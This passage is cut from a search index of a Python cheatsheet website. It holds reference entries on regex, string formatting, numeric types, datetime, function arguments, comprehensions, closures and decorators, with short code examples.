<code>'isspace()'</code> checks for <code>'[ \\t\\n\\r\\f\\v\\x1c-\\x1f\\x85\u2026]'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#regex","title":"Regex","text":"<pre><code>import re\n&lt;str&gt;   = re.sub(&lt;regex&gt;, new, text, count=0)  # Substitutes all occurrences with 'new'.\n&lt;list&gt;  = re.findall(&lt;regex&gt;, text)            # Returns all occurrences as strings.\n&lt;list&gt;  = re.split(&lt;regex&gt;, text, maxsplit=0)  # Use brackets in regex to include the matches.\n&lt;Match&gt; = re.search(&lt;regex&gt;, text)             # Searches for first occurrence of the pattern.\n&lt;Match&gt; = re.match(&lt;regex&gt;, text)              # Searches only at the beginning of the text.\n&lt;iter&gt;  = re.finditer(&lt;regex&gt;, text)           # Returns all occurrences as Match objects.\n</code></pre> <ul> <li>Argument 'new' can be a function that accepts a Match object and returns a string.</li> <li>Search() and match() return None if they can't find a match.</li> <li>Argument <code>'flags=re.IGNORECASE'</code> can be used with all functions.</li> <li>Argument <code>'flags=re.MULTILINE'</code> makes <code>'^'</code> and <code>'$'</code> match the start/end of each line.</li> <li>Argument <code>'flags=re.DOTALL'</code> makes dot also accept the <code>'\\n'</code>.</li> <li>Use <code>r'\\1'</code> or <code>'\\\\1'</code> for backreference (<code>'\\1'</code> returns a character with octal code 1).</li> <li>Add <code>'?'</code> after <code>'*'</code> and <code>'+'</code> to make them non-greedy.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#match-object","title":"Match Object","text":"<pre><code>&lt;str&gt;   = &lt;Match&gt;.group()                      # Returns the whole match. Also group(0).\n&lt;str&gt;   = &lt;Match&gt;.group(1)                     # Returns part in the first bracket.\n&lt;tuple&gt; = &lt;Match&gt;.groups()                     # Returns all bracketed parts.\n&lt;int&gt;   = &lt;Match&gt;.start()                      # Returns start index of the match.\n&lt;int&gt;   = &lt;Match&gt;.end()                        # Returns exclusive end index of the match.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#special-sequences","title":"Special Sequences","text":"<pre><code>'\\d' == '[0-9]'                                # Matches decimal characters.\n'\\w' == '[a-zA-Z0-9_]'                         # Matches alphanumerics and underscore.\n'\\s' == '[ \\t\\n\\r\\f\\v]'                        # Matches whitespaces.\n</code></pre> <ul> <li>By default, decimal characters, alphanumerics and whitespaces from all alphabets are matched unless <code>'flags=re.ASCII'</code> argument is used.</li> <li>As shown above, it restricts all special sequence matches to the first 128 characters and prevents <code>'\\s'</code> from accepting <code>'[\\x1c-\\x1f]'</code> (the so-called separator characters).</li> <li>Use a capital letter for negation (all non-ASCII characters will be matched when used in combination with ASCII flag).</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#format","title":"Format","text":"<pre><code>&lt;str&gt; = f'{&lt;el_1&gt;}, {&lt;el_2&gt;}'            # Curly brackets can also contain expressions.\n&lt;str&gt; = '{}, {}'.format(&lt;el_1&gt;, &lt;el_2&gt;)  # Or: '{0}, {a}'.format(&lt;el_1&gt;, a=&lt;el_2&gt;)\n&lt;str&gt; = '%s, %s' % (&lt;el_1&gt;, &lt;el_2&gt;)      # Redundant and inferior C style formatting.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#attributes","title":"Attributes","text":"<pre><code>&gt;&gt;&gt; Person = collections.namedtuple('Person', 'name height')\n&gt;&gt;&gt; person = Person('Jean-Luc', 187)\n&gt;&gt;&gt; f'{person.height}'\n'187'\n&gt;&gt;&gt; '{p.height}'.format(p=person)\n'187'\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#general-options","title":"General Options","text":"<pre><code>{&lt;el&gt;:&lt;10}                               # '&lt;el&gt;      '\n{&lt;el&gt;:^10}                               # '   &lt;el&gt;   '\n{&lt;el&gt;:&gt;10}                               # '      &lt;el&gt;'\n{&lt;el&gt;:.&lt;10}                              # '&lt;el&gt;......'\n{&lt;el&gt;:0}                                 # '&lt;el&gt;'\n</code></pre> <ul> <li>Options can be generated dynamically: <code>f'{&lt;el&gt;:{&lt;str/int&gt;}[\u2026]}'</code>.</li> <li>Adding <code>'!r'</code> before the colon converts object to string by calling its repr() method.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#strings","title":"Strings","text":"<pre><code>{'abcde':10}                             # 'abcde     '\n{'abcde':10.3}                           # 'abc       '\n{'abcde':.3}                             # 'abc'\n{'abcde'!r:10}                           # \"'abcde'   \"\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#numbers","title":"Numbers","text":"<pre><code>{123456:10}                              # '    123456'\n{123456:10,}                             # '   123,456'\n{123456:10_}                             # '   123_456'\n{123456:+10}                             # '   +123456'\n{123456:=+10}                            # '+   123456'\n{123456: }                               # ' 123456'\n{-123456: }                              # '-123456'\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#floats","title":"Floats","text":"<pre><code>{1.23456:10.3}                           # '      1.23'\n{1.23456:10.3f}                          # '     1.235'\n{1.23456:10.3e}                          # ' 1.235e+00'\n{1.23456:10.3%}                          # '  123.456%'\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#comparison-of-presentation-types","title":"Comparison of presentation types:","text":"<pre><code>+--------------+----------------+----------------+----------------+----------------+\n|              |    {&lt;float&gt;}   |   {&lt;float&gt;:f}  |   {&lt;float&gt;:e}  |   {&lt;float&gt;:%}  |\n+--------------+----------------+----------------+----------------+----------------+\n|  0.000056789 |   '5.6789e-05' |    '0.000057'  | '5.678900e-05' |    '0.005679%' |\n|  0.00056789  |   '0.00056789' |    '0.000568'  | '5.678900e-04' |    '0.056789%' |\n|  0.0056789   |   '0.0056789'  |    '0.005679'  | '5.678900e-03' |    '0.567890%' |\n|  0.056789    |   '0.056789'   |    '0.056789'  | '5.678900e-02' |    '5.678900%' |\n|  0.56789     |   '0.56789'    |    '0.567890'  | '5.678900e-01' |   '56.789000%' |\n|  5.6789      |   '5.6789'     |    '5.678900'  | '5.678900e+00' |  '567.890000%' |\n| 56.789       |  '56.789'      |   '56.789000'  | '5.678900e+01' | '5678.900000%' |\n+--------------+----------------+----------------+----------------+----------------+\n</code></pre> <pre><code>+--------------+----------------+----------------+----------------+----------------+\n|              |  {&lt;float&gt;:.2}  |  {&lt;float&gt;:.2f} |  {&lt;float&gt;:.2e} |  {&lt;float&gt;:.2%} |\n+--------------+----------------+----------------+----------------+----------------+\n|  0.000056789 |    '5.7e-05'   |      '0.00'    |   '5.68e-05'   |      '0.01%'   |\n|  0.00056789  |    '0.00057'   |      '0.00'    |   '5.68e-04'   |      '0.06%'   |\n|  0.0056789   |    '0.0057'    |      '0.01'    |   '5.68e-03'   |      '0.57%'   |\n|  0.056789    |    '0.057'     |      '0.06'    |   '5.68e-02'   |      '5.68%'   |\n|  0.56789     |    '0.57'      |      '0.57'    |   '5.68e-01'   |     '56.79%'   |\n|  5.6789      |    '5.7'       |      '5.68'    |   '5.68e+00'   |    '567.89%'   |\n| 56.789       |    '5.7e+01'   |     '56.79'    |   '5.68e+01'   |   '5678.90%'   |\n+--------------+----------------+----------------+----------------+----------------+\n</code></pre> <ul> <li>When both rounding up and rounding down are possible, the one that returns result with even last digit is chosen. That makes <code>'{6.5:.0f}'</code> a <code>'6'</code> and <code>'{7.5:.0f}'</code> an <code>'8'</code>.</li> <li>This rule only effects numbers that can be represented exactly by a float (<code>.5</code>, <code>.25</code>, \u2026).</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#ints","title":"Ints","text":"<pre><code>{90:c}                                   # 'Z'\n{90:b}                                   # '1011010'\n{90:X}                                   # '5A'\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#numbers_1","title":"Numbers","text":"<pre><code>&lt;int&gt;      = int(&lt;float/str/bool&gt;)       # Or: math.floor(&lt;float&gt;)\n&lt;float&gt;    = float(&lt;int/str/bool&gt;)       # Or: &lt;real&gt;e\u00b1&lt;int&gt;\n&lt;complex&gt;  = complex(real=0, imag=0)     # Or: &lt;real&gt; \u00b1 &lt;real&gt;j\n&lt;Fraction&gt; = fractions.Fraction(0, 1)    # Or: Fraction(numerator=0, denominator=1)\n&lt;Decimal&gt;  = decimal.Decimal(&lt;str/int&gt;)  # Or: Decimal((sign, digits, exponent))\n</code></pre> <ul> <li><code>'int(&lt;str&gt;)'</code> and <code>'float(&lt;str&gt;)'</code> raise ValueError on malformed strings.</li> <li>Decimal numbers are stored exactly, unlike most floats where <code>'1.1 + 2.2 != 3.3'</code>.</li> <li>Floats can be compared with: <code>'math.isclose(&lt;float&gt;, &lt;float&gt;)'</code>.</li> <li>Precision of decimal operations is set with: <code>'decimal.getcontext().prec = &lt;int&gt;'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#basic-functions","title":"Basic Functions","text":"<pre><code>&lt;num&gt; = pow(&lt;num&gt;, &lt;num&gt;)                # Or: &lt;num&gt; ** &lt;num&gt;\n&lt;num&gt; = abs(&lt;num&gt;)                       # &lt;float&gt; = abs(&lt;complex&gt;)\n&lt;num&gt; = round(&lt;num&gt; [, \u00b1ndigits])        # `round(126, -1) == 130`\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#math","title":"Math","text":"<pre><code>from math import e, pi, inf, nan, isinf, isnan\nfrom math import sin, cos, tan, asin, acos, atan, degrees, radians\nfrom math import log, log10, log2\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#statistics","title":"Statistics","text":"<pre><code>from statistics import mean, median, variance, stdev, quantiles, groupby\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#random","title":"Random","text":"<pre><code>from random import random, randint, choice, shuffle, gauss, seed\n\n&lt;float&gt; = random()                       # A float inside [0, 1).\n&lt;int&gt;   = randint(from_inc, to_inc)      # An int inside [from_inc, to_inc].\n&lt;el&gt;    = choice(&lt;sequence&gt;)             # Keeps the sequence intact.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#bin-hex","title":"Bin, Hex","text":"<pre><code>&lt;int&gt; = \u00b10b&lt;bin&gt;                         # Or: \u00b10x&lt;hex&gt;\n&lt;int&gt; = int('\u00b1&lt;bin&gt;', 2)                 # Or: int('\u00b1&lt;hex&gt;', 16)\n&lt;int&gt; = int('\u00b10b&lt;bin&gt;', 0)               # Or: int('\u00b10x&lt;hex&gt;', 0)\n&lt;str&gt; = bin(&lt;int&gt;)                       # Returns '[-]0b&lt;bin&gt;'.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#bitwise-operators","title":"Bitwise Operators","text":"<pre><code>&lt;int&gt; = &lt;int&gt; &amp; &lt;int&gt;                    # And (0b1100 &amp; 0b1010 == 0b1000).\n&lt;int&gt; = &lt;int&gt; | &lt;int&gt;                    # Or  (0b1100 | 0b1010 == 0b1110).\n&lt;int&gt; = &lt;int&gt; ^ &lt;int&gt;                    # Xor (0b1100 ^ 0b1010 == 0b0110).\n&lt;int&gt; = &lt;int&gt; &lt;&lt; n_bits                  # Left shift. Use &gt;&gt; for right.\n&lt;int&gt; = ~&lt;int&gt;                           # Not. Also -&lt;int&gt; - 1.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#combinatorics","title":"Combinatorics","text":"<ul> <li>Every function returns an iterator.</li> <li>If you want to print the iterator, you need to pass it to the list() function first!</li> </ul> <pre><code>from itertools import product, combinations, combinations_with_replacement, permutations\n</code></pre> <pre><code>&gt;&gt;&gt; product([0, 1], repeat=3)\n[(0, 0, 0), (0, 0, 1), (0, 1, 0), (0, 1, 1), ..., (1, 1, 1)]\n</code></pre> <pre><code>&gt;&gt;&gt; product('abc', 'abc')                    #   a  b  c\n[('a', 'a'), ('a', 'b'), ('a', 'c'),         # a x  x  x\n ('b', 'a'), ('b', 'b'), ('b', 'c'),         # b x  x  x\n ('c', 'a'), ('c', 'b'), ('c', 'c')]         # c x  x  x\n</code></pre> <pre><code>&gt;&gt;&gt; combinations('abc', 2)                   #   a  b  c\n[('a', 'b'), ('a', 'c'),                     # a .  x  x\n ('b', 'c')]                                 # b .  .  x\n</code></pre> <pre><code>&gt;&gt;&gt; combinations_with_replacement('abc', 2)  #   a  b  c\n[('a', 'a'), ('a', 'b'), ('a', 'c'),         # a x  x  x\n ('b', 'b'), ('b', 'c'),                     # b .  x  x\n ('c', 'c')]                                 # c .  .  x\n</code></pre> <pre><code>&gt;&gt;&gt; permutations('abc', 2)                   #   a  b  c\n[('a', 'b'), ('a', 'c'),                     # a .  x  x\n ('b', 'a'), ('b', 'c'),                     # b x  .  x\n ('c', 'a'), ('c', 'b')]                     # c x  x  .\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#datetime","title":"Datetime","text":"<ul> <li>Module 'datetime' provides 'date' <code>&lt;D&gt;</code>, 'time' <code>&lt;T&gt;</code>, 'datetime' <code>&lt;DT&gt;</code> and 'timedelta' <code>&lt;TD&gt;</code> classes. All are immutable and hashable.</li> <li>Time and datetime objects can be 'aware' <code>&lt;a&gt;</code>, meaning they have defined timezone, or 'naive' <code>&lt;n&gt;</code>, meaning they don't.</li> <li>If object is naive, it is presumed to be in the system's timezone.</li> </ul> <pre><code>from datetime import date, time, datetime, timedelta\nfrom dateutil.tz import UTC, tzlocal, gettz, datetime_exists, resolve_imaginary\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#constructors","title":"Constructors","text":"<pre><code>&lt;D&gt;  = date(year, month, day)\n&lt;T&gt;  = time(hour=0, minute=0, second=0, microsecond=0, tzinfo=None, fold=0)\n&lt;DT&gt; = datetime(year, month, day, hour=0, minute=0, second=0, ...)\n&lt;TD&gt; = timedelta(weeks=0, days=0, hours=0, minutes=0, seconds=0, ...)\n</code></pre> <ul> <li>Use <code>'&lt;D/DT&gt;.weekday()'</code> to get the day of the week as an int, with Monday being 0.</li> <li><code>'fold=1'</code> means the second pass in case of time jumping back for one hour.</li> <li>Timedelta normalizes arguments to \u00b1days, seconds (&lt; 86\u202f400) and microseconds (&lt; 1M).</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#now","title":"Now","text":"<pre><code>&lt;D/DTn&gt;  = D/DT.today()                     # Current local date or naive datetime.\n&lt;DTn&gt;    = DT.utcnow()                      # Naive datetime from current UTC time.\n&lt;DTa&gt;    = DT.now(&lt;tzinfo&gt;)                 # Aware datetime from current tz time.\n</code></pre> <ul> <li>To extract time use <code>'&lt;DTn&gt;.time()'</code>, <code>'&lt;DTa&gt;.time()'</code> or <code>'&lt;DTa&gt;.timetz()'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#timezone","title":"Timezone","text":"<pre><code>&lt;tzinfo&gt; = UTC                              # UTC timezone. London without DST.\n&lt;tzinfo&gt; = tzlocal()                        # Local timezone. Also gettz().\n&lt;tzinfo&gt; = gettz('&lt;Continent&gt;/&lt;City&gt;')      # 'Continent/City_Name' timezone or None.\n&lt;DTa&gt;    = &lt;DT&gt;.astimezone(&lt;tzinfo&gt;)        # Datetime, converted to the passed timezone.\n&lt;Ta/DTa&gt; = &lt;T/DT&gt;.replace(tzinfo=&lt;tzinfo&gt;)  # Unconverted object with a new timezone.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#encode","title":"Encode","text":"<pre><code>&lt;D/T/DT&gt; = D/T/DT.fromisoformat('&lt;iso&gt;')    # Object from ISO string. Raises ValueError.\n&lt;DT&gt;     = DT.strptime(&lt;str&gt;, '&lt;format&gt;')   # Datetime from str, according to format.\n&lt;D/DTn&gt;  = D/DT.fromordinal(&lt;int&gt;)          # D/DTn from days since the Gregorian NYE 1.\n&lt;DTn&gt;    = DT.fromtimestamp(&lt;real&gt;)         # Local time DTn from seconds since the Epoch.\n&lt;DTa&gt;    = DT.fromtimestamp(&lt;real&gt;, &lt;tz.&gt;)  # Aware datetime from seconds since the Epoch.\n</code></pre> <ul> <li>ISO strings come in following forms: <code>'YYYY-MM-DD'</code>, <code>'HH:MM:SS.mmmuuu[\u00b1HH:MM]'</code>, or both separated by an arbitrary character. All parts following hours are optional.</li> <li>Python uses the Unix Epoch: <code>'1970-01-01 00:00 UTC'</code>, <code>'1970-01-01 01:00 CET'</code>, ...</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#decode","title":"Decode","text":"<pre><code>&lt;str&gt;    = &lt;D/T/DT&gt;.isoformat(sep='T')      # Also timespec='auto/hours/minutes/seconds/\u2026'.\n&lt;str&gt;    = &lt;D/T/DT&gt;.strftime('&lt;format&gt;')    # Custom string representation.\n&lt;int&gt;    = &lt;D/DT&gt;.toordinal()               # Days since Gregorian NYE 1, ignoring time and tz.\n&lt;float&gt;  = &lt;DTn&gt;.timestamp()                # Seconds since the Epoch, from DTn in local tz.\n&lt;float&gt;  = &lt;DTa&gt;.timestamp()                # Seconds since the Epoch, from aware datetime.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#format_1","title":"Format","text":"<pre><code>&gt;&gt;&gt; dt = datetime.strptime('2015-05-14 23:39:00.00 +2000', '%Y-%m-%d %H:%M:%S.%f %z')\n&gt;&gt;&gt; dt.strftime(\"%A, %dth of %B '%y, %I:%M%p %Z\")\n\"Thursday, 14th of May '15, 11:39PM UTC+02:00\"\n</code></pre> <ul> <li><code>'%Z'</code> only accepts <code>'UTC/GMT'</code> and local timezone's code. <code>'%z'</code> also accepts <code>'\u00b1HH:MM'</code>.</li> <li>For abbreviated weekday and month use <code>'%a'</code> and <code>'%b'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#arithmetics","title":"Arithmetics","text":"<pre><code>&lt;D/DT&gt;   = &lt;D/DT&gt;  \u00b1 &lt;TD&gt;                   # Returned datetime can fall into missing hour.\n&lt;TD&gt;     = &lt;D/DTn&gt; - &lt;D/DTn&gt;                # Returns the difference, ignoring time jumps.\n&lt;TD&gt;     = &lt;DTa&gt;   - &lt;DTa&gt;                  # Ignores time jumps if they share tzinfo object.\n&lt;TD&gt;     = &lt;TD&gt;    * &lt;real&gt;                 # Also: &lt;TD&gt; = abs(&lt;TD&gt;) and &lt;TD&gt; = &lt;TD&gt; \u00b1% &lt;TD&gt;.\n&lt;float&gt;  = &lt;TD&gt;    / &lt;TD&gt;                   # How many weeks/years there are in TD. Also //.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#arguments","title":"Arguments","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#inside-function-call","title":"Inside Function Call","text":"<pre><code>func(&lt;positional_args&gt;)                           # func(0, 0)\nfunc(&lt;keyword_args&gt;)                              # func(x=0, y=0)\nfunc(&lt;positional_args&gt;, &lt;keyword_args&gt;)           # func(0, y=0)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#inside-function-definition","title":"Inside Function Definition","text":"<pre><code>def func(&lt;nondefault_args&gt;): ...                  # def func(x, y): ...\ndef func(&lt;default_args&gt;): ...                     # def func(x=0, y=0): ...\ndef func(&lt;nondefault_args&gt;, &lt;default_args&gt;): ...  # def func(x, y=0): ...\n</code></pre> <ul> <li>Default values are evaluated when function is first encountered in the scope.</li> <li>Any mutations of mutable default values will persist between invocations.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#splat-operator","title":"Splat Operator","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#inside-function-call_1","title":"Inside Function Call","text":"<p>Splat expands a collection into positional arguments, while splatty-splat expands a dictionary into keyword arguments.</p> <pre><code>args   = (1, 2)\nkwargs = {'x': 3, 'y': 4, 'z': 5}\nfunc(*args, **kwargs)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#is-the-same-as","title":"Is the same as:","text":"<pre><code>func(1, 2, x=3, y=4, z=5)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#inside-function-definition_1","title":"Inside Function Definition","text":"<p>Splat combines zero or more positional arguments into a tuple, while splatty-splat combines zero or more keyword arguments into a dictionary.</p> <pre><code>def add(*a):\n    return sum(a)\n</code></pre> <pre><code>&gt;&gt;&gt; add(1, 2, 3)\n6\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#legal-argument-combinations","title":"Legal argument combinations:","text":"<pre><code>def f(*, x, y, z): ...          # f(x=1, y=2, z=3)\ndef f(x, *, y, z): ...          # f(x=1, y=2, z=3) | f(1, y=2, z=3)\ndef f(x, y, *, z): ...          # f(x=1, y=2, z=3) | f(1, y=2, z=3) | f(1, 2, z=3)\n</code></pre> <pre><code>def f(*args): ...               # f(1, 2, 3)\ndef f(x, *args): ...            # f(1, 2, 3)\ndef f(*args, z): ...            # f(1, 2, z=3)\n</code></pre> <pre><code>def f(**kwargs): ...            # f(x=1, y=2, z=3)\ndef f(x, **kwargs): ...         # f(x=1, y=2, z=3) | f(1, y=2, z=3)\ndef f(*, x, **kwargs): ...      # f(x=1, y=2, z=3)\n</code></pre> <pre><code>def f(*args, **kwargs): ...     # f(x=1, y=2, z=3) | f(1, y=2, z=3) | f(1, 2, z=3) | f(1, 2, 3)\ndef f(x, *args, **kwargs): ...  # f(x=1, y=2, z=3) | f(1, y=2, z=3) | f(1, 2, z=3) | f(1, 2, 3)\ndef f(*args, y, **kwargs): ...  # f(x=1, y=2, z=3) | f(1, y=2, z=3)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#other-uses","title":"Other Uses","text":"<pre><code>&lt;list&gt;  = [*&lt;coll.&gt; [, ...]]    # Or: list(&lt;collection&gt;) [+ ...]\n&lt;tuple&gt; = (*&lt;coll.&gt;, [...])     # Or: tuple(&lt;collection&gt;) [+ ...]\n&lt;set&gt;   = {*&lt;coll.&gt; [, ...]}    # Or: set(&lt;collection&gt;) [| ...]\n&lt;dict&gt;  = {**&lt;dict&gt; [, ...]}    # Or: dict(**&lt;dict&gt; [, ...])\n</code></pre> <pre><code>head, *body, tail = &lt;coll.&gt;     # Head or tail can be omitted.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#inline","title":"Inline","text":""},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#lambda","title":"Lambda","text":"<pre><code>&lt;func&gt; = lambda: &lt;return_value&gt;                     # A single statement function.\n&lt;func&gt; = lambda &lt;arg_1&gt;, &lt;arg_2&gt;: &lt;return_value&gt;    # Also accepts default arguments.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#comprehensions","title":"Comprehensions","text":"<pre><code>&lt;list&gt; = [i+1 for i in range(10)]                   # Or: [1, 2, ..., 10]\n&lt;iter&gt; = (i for i in range(10) if i &gt; 5)            # Or: iter([6, 7, 8, 9])\n&lt;set&gt;  = {i+5 for i in range(10)}                   # Or: {5, 6, ..., 14}\n&lt;dict&gt; = {i: i*2 for i in range(10)}                # Or: {0: 0, 1: 2, ..., 9: 18}\n</code></pre> <pre><code>&gt;&gt;&gt; [l+r for l in 'abc' for r in 'abc']\n['aa', 'ab', 'ac', ..., 'cc']\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#map-filter-reduce","title":"Map, Filter, Reduce","text":"<pre><code>&lt;iter&gt; = map(lambda x: x + 1, range(10))            # Or: iter([1, 2, ..., 10])\n&lt;iter&gt; = filter(lambda x: x &gt; 5, range(10))         # Or: iter([6, 7, 8, 9])\n&lt;obj&gt;  = reduce(lambda out, x: out + x, range(10))  # Or: 45\n</code></pre> <ul> <li>Reduce must be imported from the functools module.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#any-all","title":"Any, All","text":"<pre><code>&lt;bool&gt; = any(&lt;collection&gt;)                          # Is `bool(el)` True for any element.\n&lt;bool&gt; = all(&lt;collection&gt;)                          # Is True for all elements or empty.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#conditional-expression","title":"Conditional Expression","text":"<pre><code>&lt;obj&gt; = &lt;exp&gt; if &lt;condition&gt; else &lt;exp&gt;             # Only one expression gets evaluated.\n</code></pre> <pre><code>&gt;&gt;&gt; [a if a else 'zero' for a in (0, 1, 2, 3)]\n['zero', 1, 2, 3]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#named-tuple-enum-dataclass","title":"Named Tuple, Enum, Dataclass","text":"<pre><code>from collections import namedtuple\nPoint = namedtuple('Point', 'x y')                  # Creates a tuple's subclass.\npoint = Point(0, 0)                                 # Returns its instance.\n</code></pre> <pre><code>from enum import Enum\nDirection = Enum('Direction', 'n e s w')            # Creates an enum.\ndirection = Direction.n                             # Returns its member.\n</code></pre> <pre><code>from dataclasses import make_dataclass\nPlayer = make_dataclass('Player', ['loc', 'dir'])   # Creates a class.\nplayer = Player(point, direction)                   # Returns its instance.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#imports","title":"Imports","text":"<pre><code>import &lt;module&gt;            # Imports a built-in or '&lt;module&gt;.py'.\nimport &lt;package&gt;           # Imports a built-in or '&lt;package&gt;/__init__.py'.\nimport &lt;package&gt;.&lt;module&gt;  # Imports a built-in or '&lt;package&gt;/&lt;module&gt;.py'.\n</code></pre> <ul> <li>Package is a collection of modules, but it can also define its own objects.</li> <li>On a filesystem this corresponds to a directory of Python files with an optional init script.</li> <li>Running <code>'import &lt;package&gt;'</code> does not automatically provide access to the package's modules unless they are explicitly imported in its init script.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#closure","title":"Closure","text":"<p>We have/get a closure in Python when: * A nested function references a value of its enclosing function and then * the enclosing function returns the nested function.</p> <pre><code>def get_multiplier(a):\n    def out(b):\n        return a * b\n    return out\n</code></pre> <pre><code>&gt;&gt;&gt; multiply_by_3 = get_multiplier(3)\n&gt;&gt;&gt; multiply_by_3(10)\n30\n</code></pre> <ul> <li>If multiple nested functions within enclosing function reference the same value, that value gets shared.</li> <li>To dynamically access function's first free variable use <code>'&lt;function&gt;.__closure__[0].cell_contents'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#partial","title":"Partial","text":"<pre><code>from functools import partial\n&lt;function&gt; = partial(&lt;function&gt; [, &lt;arg_1&gt;, &lt;arg_2&gt;, ...])\n</code></pre> <pre><code>&gt;&gt;&gt; import operator as op\n&gt;&gt;&gt; multiply_by_3 = partial(op.mul, 3)\n&gt;&gt;&gt; multiply_by_3(10)\n30\n</code></pre> <ul> <li>Partial is also useful in cases when function needs to be passed as an argument because it enables us to set its arguments beforehand.</li> <li>A few examples being: <code>'defaultdict(&lt;function&gt;)'</code>, <code>'iter(&lt;function&gt;, to_exclusive)'</code> and dataclass's <code>'field(default_factory=&lt;function&gt;)'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#non-local","title":"Non-Local","text":"<p>If variable is being assigned to anywhere in the scope, it is regarded as a local variable, unless it is declared as a 'global' or a 'nonlocal'.</p> <pre><code>def get_counter():\n    i = 0\n    def out():\n        nonlocal i\n        i += 1\n        return i\n    return out\n</code></pre> <pre><code>&gt;&gt;&gt; counter = get_counter()\n&gt;&gt;&gt; counter(), counter(), counter()\n(1, 2, 3)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#decorator","title":"Decorator","text":"<ul> <li>A decorator takes a function, adds some functionality and returns it.</li> <li>It can be any callable, but is usually implemented as a function that returns a closure.</li> </ul> <pre><code>@decorator_name\ndef function_that_gets_passed_to_decorator():\n    ...\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#debugger-example","title":"Debugger Example","text":"<p>Decorator that prints function's name every time the function is called.</p> <pre><code>from functools import wraps\n\ndef debug(func):\n    @wraps(func)\n    def out(*args, **kwargs):\n        print(func.__name__)\n        return func(*args, **kwargs)\n    return out\n\n@debug\ndef add(x, y):\n    return x + y\n</code></pre> <ul> <li>Wraps is a helper decorator that copies the metadata of the passed function (func) to the function it is wrapping (out).</li> <li>Without it <code>'add.__name__'</code> would return <code>'out'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#lru-cache","title":"LRU Cache","text":"<p>Decorator that caches function's return values. All function's arguments must be hashable.</p> <pre><code>from functools import lru_cache\n\n@lru_cache(maxsize=None)\ndef fib(n):\n    return n if n &lt; 2 else fib(n-2) + fib(n-1)\n</code></pre> <ul> <li>Default size of the cache is 128 values. Passing <code>'maxsize=None'</code> makes it unbounded.</li> <li>CPython interpreter limits recursion depth to 1000 by default. To increase it use <code>'sys.setrecursionlimit(&lt;depth&gt;)'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#parametrized-decorator","title":"Parametrized Decorator","text":"<p>A decorator that accepts arguments and returns a normal decorator that accepts a function.</p> <pre><code>from functools import wraps\n\ndef debug(print_result=False):\n    def decorator(func):\n        @wraps(func)\n        def out(*args, **kwargs):\n            result = func(*args, **kwargs)\n            print(func.__name__, result if print_result else '')\n            return result\n        return out\n    return decorator\n\n@debug(print_result=True)\ndef add(x, y):\n    return x + y\n</code></pre> <ul> <li>Using only <code>'@debug'</code> to decorate the add() function would not work here, because debug would then receive the add() function as a 'print_result' argument. Decorators can 